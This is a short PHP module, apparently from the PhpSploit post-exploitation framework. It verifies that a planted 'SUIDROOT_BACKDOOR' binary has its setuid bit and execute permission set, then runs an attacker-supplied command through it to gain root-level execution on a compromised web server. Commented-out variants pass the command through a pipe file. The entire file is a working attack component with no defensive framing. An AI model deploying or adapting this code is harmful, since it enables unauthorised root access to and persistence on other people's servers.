<?

!import(execute)
!import(getPerms)

// check SUIDROOT_BACKDOOR permissions
if (substr(getPerms($PHPSPLOIT['BACKDOOR']), 3, 1) != 's')
    return error("%s (SUIDROOT_BACKDOOR): SUID bit is not set",
        $PHPSPLOIT['BACKDOOR']);
if (substr(getPerms($PHPSPLOIT['BACKDOOR']), 9, 1) != 'x')
    return error("%s (SUIDROOT_BACKDOOR): Not executable",
        $PHPSPLOIT['BACKDOOR']);

// // write command to SUIDROOT_PIPE file
// if (($pipe_file = @fopen($PHPSPLOIT['PIPE'], 'w')) === False)
//     return error("%s (SUIDROOT_PIPE): Not writeable",
//         $PHPSPLOIT['PIPE']);
// fwrite($pipe_file, $PHPSPLOIT['COMMAND']);
// fclose($pipe_file);

// execute SUIDROOT_BACKDOOR
// return $PHPSPLOIT['BACKDOOR'] . " " . $PHPSPLOIT["COMMAND"];
$result = execute($PHPSPLOIT['BACKDOOR'] . " " . $PHPSPLOIT["COMMAND"]);
// $result = execute("exec 2>&1;" . $PHPSPLOIT['BACKDOOR']);
// file_put_contents($PHPSPLOIT['PIPE'], "");
return $result;

?>
